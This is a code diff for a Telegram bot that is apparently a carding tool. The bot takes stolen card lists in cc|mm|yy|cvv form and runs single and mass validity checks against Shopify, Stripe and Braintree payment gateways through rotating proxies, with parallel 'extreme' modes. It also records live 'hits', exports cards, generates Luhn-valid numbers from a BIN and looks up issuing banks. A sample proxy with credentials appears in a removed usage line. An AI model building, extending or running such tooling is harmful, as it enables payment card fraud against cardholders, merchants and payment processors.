-        await user_manager.increment_checks(user_id, "check")
-        
-        emoji = get_status_emoji(result.status)
-        confidence_icon = get_confidence_icon(result.confidence)
-        
-        reason_escaped = escape_markdown(result.reason)
-        status_escaped = escape_markdown(result.status.value.upper())
-        confidence_escaped = escape_markdown(result.confidence.value)
-        
-        response = (
-            f"{emoji} *RESULTADO SHOPIFY*\n"
-            f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"💳 Tarjeta: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
-            f"📊 Estado: {status_escaped}\n"
-            f"{confidence_icon} Confianza: {confidence_escaped}\n"
-            f"📝 Razón: {reason_escaped}\n"
-            f"⏱️ Tiempo: {result.response_time:.1f}s\n"
-        )
-        
-        if result.price != "N/A":
-            price_escaped = escape_markdown(result.price)
-            response += f"💰 Precio: {price_escaped}\n"
-        
-        try:
-            await msg.edit_text(response, parse_mode="Markdown")
-        except Exception as e:
-            await msg.edit_text(response.replace('*', '').replace('_', ''))
+✅ All cards pass Luhn validation
+{get_bot_footer()}"""
     else:
-        await update.message.reply_text(
-            "❌ Formato inválido. Usa:\n"
-            "`NUMBER|MES|AÑO|CVV`\n"
-            "Ejemplo: `4377110010309114|08|2026|501`",
-            parse_mode="Markdown"
-        )
+        return f"""{get_bot_header('shopify')}
 
-# ================== MANEJO DE ARCHIVOS ==================
-async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    document = update.message.document
-    
-    if user_id in active_mass:
-        await update.message.reply_text("❌ Mass check en progreso")
+🎲 *CARD GENERATOR ─ LUHN*
+{LINE_DOT}
+💳 {stylize_text('BIN')}  ➜  `{bin_prefix}`
+🔢 {stylize_text('Amount')}  ➜  {len(cards)}
+
+💳 *{stylize_text('Generated Cards')}*
+{cards_text}
+
+✅ All cards pass Luhn validation
+{get_bot_footer()}"""
+
+@bot.message_handler(commands=['bin'])
+def bin_command(message):
+    """Comando /bin - Consultar info de un BIN sin hacer check"""
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /bin 424242")
         return
     
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Solo archivos .txt")
+    bin_number = args[1].strip()[:6]
+    if not bin_number.isdigit() or len(bin_number) < 6:
+        bot.reply_to(message, "❌ Invalid BIN. Must be 6 digits. Example: /bin 424242")
         return
     
-    file = await context.bot.get_file(document.file_id)
-    content = await file.download_as_bytearray()
-    text = content.decode('utf-8', errors='ignore')
-    lines = text.splitlines()
+    processing_msg = bot.reply_to(message, "🔍 *Looking up BIN info...*", parse_mode='Markdown')
     
-    sites = []
-    proxies = []
-    cards = []
-    invalid = []
-    unknown = []
+    bin_info = bin_lookup(bin_number)
     
-    for raw_line in lines:
-        line = raw_line.strip()
-        if not line:
-            continue
-        
-        line_type, normalized = detect_line_type(line)
-        
-        if line_type == 'site':
-            sites.append(normalized)
-        elif line_type == 'proxy':
-            proxies.append(normalized)
-        elif line_type == 'card':
-            card_data = CardValidator.parse_card(normalized)
-            if card_data:
-                cards.append(normalized)
-            else:
-                invalid.append(line)
-        else:
-            unknown.append(line)
-    
-    user_data = await user_manager.get_user_data(user_id)
-    updated = False
-    
-    if sites:
-        user_data["sites"].extend(sites)
-        updated = True
-    if proxies:
-        user_data["proxies"].extend(proxies)
-        updated = True
-    if cards:
-        user_data["cards"].extend(cards)
-        updated = True
-    
-    if updated:
-        await user_manager.update_user_data(
-            user_id, 
-            sites=user_data["sites"],
-            proxies=user_data["proxies"],
-            cards=user_data["cards"]
-        )
-    
-    parts = []
-    if sites:
-        parts.append(f"✅ {len(sites)} sitio(s) añadido(s)")
-    if proxies:
-        parts.append(f"✅ {len(proxies)} proxy(s) añadido(s)")
-    if cards:
-        parts.append(f"✅ {len(cards)} tarjeta(s) válida(s) añadida(s)")
-    if invalid:
-        parts.append(f"⚠️ {len(invalid)} tarjeta(s) inválida(s) rechazada(s)")
-    if unknown:
-        parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")
-    
-    if parts:
-        await update.message.reply_text("\n".join(parts))
+    if bin_info:
+        level_line = f"\n   ├ {stylize_text('Level')}: {bin_info.get('level')}" if bin_info.get('level') else ""
+        response = f"""{get_bot_header('shopify')}
+
+🏦 *BIN LOOKUP*
+{LINE_DOT}
+💳 {stylize_text('BIN')}  ➜  `{bin_number}`
+
+📋 *{stylize_text('Details')}*
+   ├ {stylize_text('Brand')}: {bin_info.get('brand', 'Unknown')}
+   ├ {stylize_text('Type')}: {bin_info.get('type', 'Unknown')}{level_line}
+   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
+   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}
+{get_bot_footer()}"""
     else:
-        await update.message.reply_text("❌ No se encontraron datos válidos en el archivo")
+        response = f"""❌ *BIN NOT FOUND*
+{LINE_THIN}
+🏦 BIN `{bin_number}` not found in database.
+💡 Try another BIN number."""
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
 
-# ================== COMANDO START ==================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if user_id in active_mass:
-        active_mass.discard(user_id)
-    
-    await show_main_menu(update, context, edit=False)
-
-# ================== COMANDO STOP ==================
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id in active_mass:
-        cancel_mass[user_id] = True
-        await update.message.reply_text("⏹ Deteniendo mass check...")
-    else:
-        await update.message.reply_text("No hay mass check activo.")
-
-# ================== COMANDOS DE PROXIES ==================
-async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass\n"
-            "Ejemplo: /addproxy 23.26.53.37:6003:ywdcxpbz:rumq51bx8tk3"
-        )
-        return
-    
-    proxy_input = " ".join(context.args)
-    line_type, normalized = detect_line_type(proxy_input)
-    
-    if line_type != 'proxy':
-        await update.message.reply_text("❌ Formato de proxy inválido")
-        return
-    
-    user_data = await user_manager.get_user_data(user_id)
-    user_data["proxies"].append(normalized)
-    await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
-    
-    display = normalized.split(':')[0] + ':' + normalized.split(':')[1]
-    await update.message.reply_text(f"✅ Proxy añadido: {display}")
-
-async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    proxies = user_data["proxies"]
-    
-    if not proxies:
-        await update.message.reply_text("📭 No tienes proxies guardados.")
-        return
-    
-    lines = ["📋 *TUS PROXIES*", "━━━━━━━━━━━━━━━━━━", ""]
-    for i, p in enumerate(proxies, 1):
-        display = p.split(':')[0] + ':' + p.split(':')[1]
-        lines.append(f"{i}. `{display}`")
-    
-    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
-
-async def clean_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    proxies = user_data["proxies"]
-    
-    if not proxies:
-        await update.message.reply_text("📭 No hay proxies para limpiar.")
-        return
-    
-    msg = await update.message.reply_text("🔄 Verificando proxies...")
-    
-    health_checker = ProxyHealthChecker(db, user_id)
-    results = await health_checker.check_all_proxies(proxies)
-    
-    alive_proxies = [r["proxy"] for r in results if r["alive"]]
-    dead_count = len([r for r in results if not r["alive"]])
-    
-    await user_manager.update_user_data(user_id, proxies=alive_proxies)
-    
-    await msg.edit_text(
-        f"✅ Proxies vivos: {len(alive_proxies)}\n"
-        f"❌ Proxies muertos eliminados: {dead_count}"
+@bot.message_handler(commands=['mode'])
+def mode_command(message):
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
+        InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
+        InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
     )
+    current_mode_text = {
+        "seguro": "🐢 SAFE",
+        "rapido": "⚡ FAST",
+        "extremo": "🚀 EXTREME"
+    }
+    bot.reply_to(message, f"""🎮 *{BOT_NAME} ─ SHOPIFY MODE*
+{LINE_DASH}
 
-# ================== MAIN ==================
-async def shutdown(application: Application):
-    logger.info("🛑 Cerrando...")
-    if db:
-        await db.shutdown()
-    logger.info("✅ Cerrado")
+🔄 *Current:* {current_mode_text.get(current_mode, 'FAST')} ({PARALLEL_WORKERS}x)
+⚠️ *Applies to Shopify /mass only*
 
-async def post_init(application: Application):
-    global db, user_manager, card_service
-    
-    db = Database()
-    await db.initialize()
-    await db.cleanup_old_results()
-    
-    user_manager = UserManager(db)
-    card_service = CardCheckService(db, user_manager)
-    
-    logger.info("✅ Bot inicializado - Shopify + GiveWP + Stripe Hitter")
+🔽 *Select parallel mode:*""", 
+                 parse_mode='Markdown', reply_markup=markup)
 
-def main():
-    app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
-    app.post_shutdown = shutdown
+# ============================================
+# CALLBACKS
+# ============================================
 
-    # Comandos básicos
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_command))
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    global current_max_workers, mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
     
-    # Comandos de proxies
-    app.add_handler(CommandHandler("addproxy", add_proxy))
-    app.add_handler(CommandHandler("proxies", list_proxies))
-    app.add_handler(CommandHandler("cleanproxies", clean_proxies))
+    if call.data == "check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "📝 /chk cc|mm|yy|cvv")
     
-    # Comandos GiveWP
-    app.add_handler(CommandHandler("donate", donate))
-    app.add_handler(CommandHandler("donate5", donate5))
-    app.add_handler(CommandHandler("donate10", donate10))
-    app.add_handler(CommandHandler("donate20", donate20))
+    elif call.data == "mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/mass")
     
-    # Comandos Stripe
-    app.add_handler(CommandHandler("addstripe", add_stripe_url))
-    app.add_handler(CommandHandler("mystripe", list_stripe_urls))
-    app.add_handler(CommandHandler("removestripe", remove_stripe_url))
-    app.add_handler(CommandHandler("hit", hit_stripe))
-    app.add_handler(CommandHandler("stophit", stop_hit))
-    app.add_handler(CommandHandler("stripestats", stripe_stats))
+    elif call.data == "stripe_check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🔓 /au cc|mm|yy|cvv")
     
-    # Comandos de análisis
-    app.add_handler(CommandHandler("analyze", analyze_site))
-    app.add_handler(CommandHandler("findsites", find_similar_sites))
+    elif call.data == "stripe_mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/mau")
     
-    # Callbacks
-    app.add_handler(CallbackQueryHandler(button_handler))
+    elif call.data == "sc_check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "💳 /sc cc|mm|yy|cvv")
     
-    # Mensajes y archivos
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
-    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
+    elif call.data == "sc_mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/msc")
+    
+    elif call.data == "sc_hits":
+        bot.answer_callback_query(call.id)
+        sc_hits_command(call.message)
+    
+    elif call.data == "b3_check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🔐 /b3 cc|mm|yy|cvv")
+    
+    elif call.data == "b3_mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/mb3")
+    
+    elif call.data == "b3_hits":
+        bot.answer_callback_query(call.id)
+        b3_hits_command(call.message)
+    
+    elif call.data == "stats":
+        bot.answer_callback_query(call.id)
+        show_stats(call.message)
+    
+    elif call.data == "hits":
+        bot.answer_callback_query(call.id)
+        hits_command(call.message)
+    
+    elif call.data == "stripe_hits":
+        bot.answer_callback_query(call.id)
+        stripe_hits_command(call.message)
+    
+    elif call.data == "sites":
+        bot.answer_callback_query(call.id)
+        list_sites_command(call.message)
+    
+    elif call.data == "proxies":
+        bot.answer_callback_query(call.id)
+        proxies = load_proxies()
+        if not proxies:
+            bot.send_message(call.message.chat.id, "❌ No proxies saved")
+            return
+        file_content = "\n".join(proxies)
+        file_path = os.path.join(DATA_DIR, "proxy_export.txt")
+        with open(file_path, 'w') as f:
+            f.write(file_content)
+        with open(file_path, 'rb') as f:
+            bot.send_document(call.message.chat.id, f, caption=f"📡 Proxies: {len(proxies)}", visible_file_name="proxies.txt")
+        try:
+            os.remove(file_path)
+        except:
+            pass
+    
+    elif call.data == "px":
+        bot.answer_callback_query(call.id)
+        proxy_check_command(call.message)
+    
+    elif call.data == "bin_lookup":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🏦 Send BIN number:\n/bin `424242`", parse_mode='Markdown')
+    
+    elif call.data == "gen_cards":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🎲 Generate cards with Luhn:\n/gen `424242` `10`\n\nFormat: /gen BIN [amount]", parse_mode='Markdown')
+    
+    elif call.data.startswith("regen_"):
+        parts = call.data.split("_", 2)
+        if len(parts) == 3:
+            bin_prefix = parts[1]
+            count = int(parts[2])
+            bot.answer_callback_query(call.id, "🔄 Regenerating...")
+            cards = generate_cards_from_bin(bin_prefix, count)
+            bin_info = bin_lookup(bin_prefix[:6])
+            response = _format_gen_response(bin_prefix, count, cards, bin_info)
+            regen_markup = InlineKeyboardMarkup()
+            regen_markup.row(
+                InlineKeyboardButton("🔄 Regenerate", callback_data=f"regen_{bin_prefix}_{count}"),
+                InlineKeyboardButton("📋 Copy All", callback_data=f"gencopy_{bin_prefix}_{count}")
+            )
+            try:
+                bot.edit_message_text(response, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown', reply_markup=regen_markup)
+            except:
+                pass
+    
+    elif call.data.startswith("gencopy_"):
+        parts = call.data.split("_", 2)
+        if len(parts) == 3:
+            bin_prefix = parts[1]
+            count = int(parts[2])
+            bot.answer_callback_query(call.id, "📋 Generating plain text...")
+            cards = generate_cards_from_bin(bin_prefix, count)
+            plain_text = '\n'.join(cards)
+            bot.send_message(call.message.chat.id, f"```\n{plain_text}\n```", parse_mode='Markdown')
+    
+    elif call.data == "export":
+        bot.answer_callback_query(call.id)
+        cards = get_all_cards()
+        if not cards:
+            bot.send_message(call.message.chat.id, "❌ No Shopify cards to export")
+            return
+        content = "\n".join(cards)
+        file_data = BytesIO(content.encode('utf-8'))
+        file_data.name = f"cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        bot.send_document(call.message.chat.id, file_data, caption=f"💳 {len(cards)} Shopify cards")
+    
+    elif call.data == "clear_menu":
+        shopify_count = len(get_all_cards())
+        stripe_count = len(get_all_stripe_cards())
+        sc_count = len(get_all_sc_cards())
+        b3_count = len(get_all_b3_cards())
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton(f"🛒 Delete Shopify Cards ({shopify_count})", callback_data="confirm_clear_shopify"),
+            InlineKeyboardButton(f"🔓 Delete Stripe Auth Cards ({stripe_count})", callback_data="confirm_clear_stripe"),
+            InlineKeyboardButton(f"💳 Delete Stripe Charge Cards ({sc_count})", callback_data="confirm_clear_sc"),
+            InlineKeyboardButton(f"🔐 Delete Braintree Auth Cards ({b3_count})", callback_data="confirm_clear_b3"),
+            InlineKeyboardButton("↩️ Cancel", callback_data="cancel_clear")
+        )
+        try:
+            bot.edit_message_text(f"""⚠️ *{BOT_NAME} ─ DELETE CARDS*
+{LINE_DASH}
 
-    logger.info("🚀 Bot iniciado - Shopify + GiveWP + Stripe Hitter + Analyzer")
-    app.run_polling()
+🛒 Shopify: *{shopify_count}* cards
+🔓 Stripe Auth: *{stripe_count}* cards
+💳 Stripe Charge $10: *{sc_count}* cards
+🔐 Braintree Auth: *{b3_count}* cards
 
+🔽 *Select which cards to delete:*""", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown', reply_markup=markup)
+        except:
+            pass
+        bot.answer_callback_query(call.id)
+    
+    elif call.data == "confirm_clear_shopify":
+        count = len(get_all_cards())
+        clear_cards()
+        bot.answer_callback_query(call.id, f"✅ {count} Shopify cards deleted")
+        try:
+            bot.edit_message_text(f"🗑️ *{count} Shopify cards deleted*\n{LINE_THIN}\n🛒 Shopify queue is now empty", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "confirm_clear_stripe":
+        count = len(get_all_stripe_cards())
+        clear_stripe_cards()
+        bot.answer_callback_query(call.id, f"✅ {count} Stripe Auth cards deleted")
+        try:
+            bot.edit_message_text(f"🗑️ *{count} Stripe Auth cards deleted*\n{LINE_THIN}\n🔓 Stripe Auth queue is now empty", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "confirm_clear_sc":
+        count = len(get_all_sc_cards())
+        clear_sc_cards()
+        bot.answer_callback_query(call.id, f"✅ {count} Stripe Charge cards deleted")
+        try:
+            bot.edit_message_text(f"🗑️ *{count} Stripe Charge $10 cards deleted*\n{LINE_THIN}\n💳 Stripe Charge queue is now empty", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "confirm_clear_b3":
+        count = len(get_all_b3_cards())
+        clear_b3_cards()
+        bot.answer_callback_query(call.id, f"✅ {count} Braintree Auth cards deleted")
+        try:
+            bot.edit_message_text(f"🗑️ *{count} Braintree Auth cards deleted*\n{LINE_THIN}\n🔐 Braintree Auth queue is now empty", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "cancel_clear":
+        bot.answer_callback_query(call.id, "Cancelled")
+        try:
+            bot.edit_message_text(f"↩️ *Operation cancelled*\n{LINE_THIN}\nNo cards were deleted", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "stop_mass":
+        if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
+            stop_mass_flag = True
+            bot.answer_callback_query(call.id, "🛑 Stopping mass check...")
+            try:
+                if current_mass_msg and current_mass_chat_id:
+                    bot.edit_message_text(f"""🛑 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏳ *STOPPING MASS CHECK...*
+
+Please wait while workers finish...""",
+                        chat_id=current_mass_chat_id, message_id=current_mass_msg.message_id,
+                        parse_mode='Markdown')
+            except:
+                pass
+        else:
+            bot.answer_callback_query(call.id, "No active mass check")
+    
+    elif call.data == "fix_sites":
+        bot.answer_callback_query(call.id)
+        old_count = len(load_sites())
+        new_count = fix_all_sites()
+        bot.send_message(call.message.chat.id, f"🔧 *Sites Repaired*\n{LINE_THIN}\n📊 Before: *{old_count}*\n📊 After: *{new_count}*", parse_mode='Markdown')
+    
+    elif call.data == "permanent_sites":
+        bot.answer_callback_query(call.id)
+        permanent = sqlite_backup.get_permanent_sites()
+        if not permanent:
+            bot.send_message(call.message.chat.id, "🔒 No permanent sites yet.")
+            return
+        response = f"🔒 *{BOT_NAME} ─ PERMANENT SITES ({len(permanent)})*\n{LINE_DASH}\n\n"
+        for i, site in enumerate(permanent[:20], 1):
+            response += f"  {i}. `{site['url']}`\n     └─ ✅ Success: *{site['success_count']}*\n"
+        safe_send_message(call.message.chat.id, response, parse_mode='Markdown')
+    
+    elif call.data == "mode_menu":
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
+            InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
+            InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
+        )
+        try:
+            bot.edit_message_text(f"""🎮 *{BOT_NAME} ─ SHOPIFY MODE*
+{LINE_DASH}
+
+🔄 *Current:* {current_mode} ({PARALLEL_WORKERS}x)
+⚠️ *Applies to Shopify /mass only*
+
+🔽 *Select parallel mode:*""", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown', reply_markup=markup)
+        except:
+            pass
+        bot.answer_callback_query(call.id)
+    
+    elif call.data == "mode_seguro":
+        current_mode = "seguro"
+        PARALLEL_WORKERS = 1
+        bot.answer_callback_query(call.id, "✅ SAFE mode activated")
+        try:
+            bot.edit_message_text(f"🐢 *SAFE mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *1x*", chat_id=call.message.chat.id, 
+                                message_id=call.message.message_id, parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "mode_rapido":
+        current_mode = "rapido"
+        PARALLEL_WORKERS = 3
+        bot.answer_callback_query(call.id, "✅ FAST mode activated")
+        try:
+            bot.edit_message_text(f"⚡ *FAST mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *3x*", chat_id=call.message.chat.id, 
+                                message_id=call.message.message_id, parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "mode_extremo":
+        current_mode = "extremo"
+        PARALLEL_WORKERS = 5
+        bot.answer_callback_query(call.id, "✅ EXTREME mode activated")
+        try:
+            bot.edit_message_text(f"🚀 *EXTREME mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *5x*", chat_id=call.message.chat.id, 
+                                message_id=call.message.message_id, parse_mode='Markdown')
+        except:
+            pass
+    
+    elif call.data == "delete_dead_proxies":
+        if last_dead_proxies:
+            count = delete_dead_proxies(last_dead_proxies)
+            remaining = len(load_proxies())
+            bot.answer_callback_query(call.id, f"✅ {count} dead proxies deleted")
+            try:
+                bot.edit_message_text(f"🗑️ *{count} dead proxies deleted*\n{LINE_THIN}\n📡 Remaining proxies: *{remaining}*", 
+                                    chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                    parse_mode='Markdown')
+            except:
+                pass
+            last_dead_proxies = []
+        else:
+            bot.answer_callback_query(call.id, "No dead proxies to delete")
+    
+    elif call.data.startswith("file_gw_"):
+        global pending_file_cards
+        bot.answer_callback_query(call.id)
+        chat_id_str = str(call.message.chat.id)
+        
+        if chat_id_str not in pending_file_cards:
+            try:
+                bot.edit_message_text("❌ No pending cards. Please upload a file again.",
+                                    chat_id=call.message.chat.id, message_id=call.message.message_id)
+            except:
+                pass
+        else:
+            gw_choice = call.data.replace("file_gw_", "")
+            
+            if gw_choice == "all":
+                gateways = ["shopify", "stripe_auth", "stripe_charge", "braintree_auth"]
+                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge $10", "🔐 Braintree Auth $0"]
+            elif gw_choice == "shopify":
+                gateways = ["shopify"]
+                gw_names = ["🛒 Shopify"]
+            elif gw_choice == "stripe_auth":
+                gateways = ["stripe_auth"]
+                gw_names = ["🔓 Stripe Auth"]
+            elif gw_choice == "stripe_charge":
+                gateways = ["stripe_charge"]
+                gw_names = ["💳 Stripe Charge $10"]
+            elif gw_choice == "braintree_auth":
+                gateways = ["braintree_auth"]
+                gw_names = ["🔐 Braintree Auth $0"]
+            else:
+                gateways = []
+                gw_names = []
+            
+            total_results = []
+            for gw in gateways:
+                total_cards, added, dup = process_file_cards_to_gateway(chat_id_str, gw)
+                total_results.append((gw, added, dup))
+            
+            if chat_id_str in pending_file_cards:
+                del pending_file_cards[chat_id_str]
+            
+            response = f"""\n{LINE_DASH}\n📂 *CARDS LOADED*\n{LINE_DASH}\n"""
+            
+            for i, (gw, added, dup) in enumerate(total_results):
+                gw_display = gw_names[i] if i < len(gw_names) else gw
+                response += f"\n{gw_display}:\n   ├ ✅ Added: *{added}*\n   └ 🔄 Duplicates: *{dup}*\n"
+            
+            response += f"\n{LINE_THIN}\n📊 *Queues:*\n"
+            response += f"   🛒 Shopify: *{len(get_all_cards())}*\n"
+            response += f"   🔓 Stripe Auth: *{len(get_all_stripe_cards())}*\n"
+            response += f"   💳 Stripe Charge $10: *{len(get_all_sc_cards())}*\n"
+            response += f"   🔐 Braintree Auth $0: *{len(get_all_b3_cards())}*"
+            
+            markup = InlineKeyboardMarkup(row_width=1)
+            if gw_choice == "shopify" or gw_choice == "all":
+                if len(get_all_cards()) > 0:
+                    markup.add(InlineKeyboardButton("🛒 START SHOPIFY MASS ▶️", callback_data="mass"))
+            if gw_choice == "stripe_auth" or gw_choice == "all":
+                if len(get_all_stripe_cards()) > 0:
+                    markup.add(InlineKeyboardButton("🔓 START AU MASS ▶️", callback_data="stripe_mass"))
+            if gw_choice == "stripe_charge" or gw_choice == "all":
+                if len(get_all_sc_cards()) > 0:
+                    markup.add(InlineKeyboardButton("💳 START SC MASS ▶️", callback_data="sc_mass"))
+            if gw_choice == "braintree_auth" or gw_choice == "all":
+                if len(get_all_b3_cards()) > 0:
+                    markup.add(InlineKeyboardButton("🔐 START B3 MASS ▶️", callback_data="b3_mass"))
+            
+            try:
+                bot.edit_message_text(response, chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                    parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
+            except:
+                try:
+                    bot.edit_message_text(response.replace('*', ''), chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                        reply_markup=markup if markup.keyboard else None)
+                except:
+                    pass
+    
+    elif call.data == "help":
+        help_text = f"""❓ *{BOT_NAME} {BOT_VERSION}*
+{LINE_DASH}
+📖 *COMMAND REFERENCE*
+
+🛒 *━━ SHOPIFY GATEWAY ━━*
+  /chk `cc|mm|yy|cvv` ─ Single check
+  /mass ─ Mass check (pipeline)
+  /clearshopify ─ Delete cards
+  /hits ─ View hits
+
+🔓 *━━ STRIPE AUTH (FREE) ━━*
+  /au `cc|mm|yy|cvv` ─ Single check
+  /mau ─ Mass check (pipeline)
+  /clearau ─ Delete cards
+  /auhits ─ View hits
+
+💳 *━━ STRIPE CHARGE $10 ━━*
+  /sc `cc|mm|yy|cvv` ─ Single check
+  /msc ─ Mass check (pipeline)
+  /clearsc ─ Delete cards
+  /schits ─ View hits
+
+🔐 *━━ BRAINTREE AUTH $0 ━━*
+  /b3 `cc|mm|yy|cvv` ─ Single check
+  /mb3 ─ Mass check (pipeline)
+  /clearb3 ─ Delete cards
+  /b3hits ─ View hits
+
+🏦 *━━ UTILITIES ━━*
+  /bin `424242` ─ BIN lookup
+  /gen `424242` `10` ─ Generate cards (Luhn)
+  /px ─ Deep proxy check (3 levels)
+  /addproxy `IP:PORT` ─ Add proxy
+  /delproxy ─ Delete proxy
+
+⚙️ *━━ SETTINGS ━━*
+  /stats ─ Statistics panel
+  /mode ─ Shopify mode (1x/3x/5x)
+  /stop ─ Stop active mass check
+
+📂 *━━ FILE UPLOAD ━━*
+  Send `.txt` file → select gateway
+
+🧹 *━━ AUTO-MAINTENANCE ━━*
+  Dead sites auto-cleaned every 50 checks
+  Smart site rotation (best sites first)
+{LINE_THIN}
+🤖 {BOT_NAME} {BOT_VERSION}"""
+        try:
+            bot.edit_message_text(help_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown')
+        except:
+            pass
+        bot.answer_callback_query(call.id)
+    
+    else:
+        bot.answer_callback_query(call.id)
+
+# ============================================
+# RAILWAY HEALTH CHECK SERVER
+# ============================================
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class HealthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"OK")
+    def log_message(self, format, *args):
+        pass
+
+def start_health_server():
+    port = int(os.environ.get("PORT", 0))
+    if port:
+        server = HTTPServer(("0.0.0.0", port), HealthHandler)
+        t = threading.Thread(target=server.serve_forever, daemon=True)
+        t.start()
+        print(f"  🏥 Health check server on port {port}")
+
+# ============================================
+# START BOT
+# ============================================
 if __name__ == "__main__":
-    main()
+    print("\n" + "═" * 60)
+    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE $10 + BRAINTREE AUTH")
+    print(f"  🚀 PARALLEL PIPELINE MODE")
+    print("═" * 60)
+    print(f"  🌐 Public mode: ALL USERS")
+    print(f"  📂 Data dir: {DATA_DIR}")
+    print(f"  🛒 Shopify cards: {len(get_all_cards())}")
+    print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
+    print(f"  💳 Stripe Charge $10 cards: {len(get_all_sc_cards())}")
+    print(f"  🔐 Braintree Auth $0 cards: {len(get_all_b3_cards())}")
+    print(f"  🌐 Sites: {len(load_sites())}")
+    print(f"  📡 Proxies: {len(load_proxies())}")
+    print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
+    print("─" * 60)
+    print("  COMMANDS:")
+    print("    /mass  ─ Shopify mass check")
+    print("    /mau   ─ Stripe Auth mass check (FREE)")
+    print("    /msc   ─ Stripe Charge $10 mass check")
+    print("    /mb3   ─ Braintree Auth $0 mass check")
+    print("    /px    ─ Check proxies")
+    print("    /stats ─ Statistics")
+    print("─" * 60)
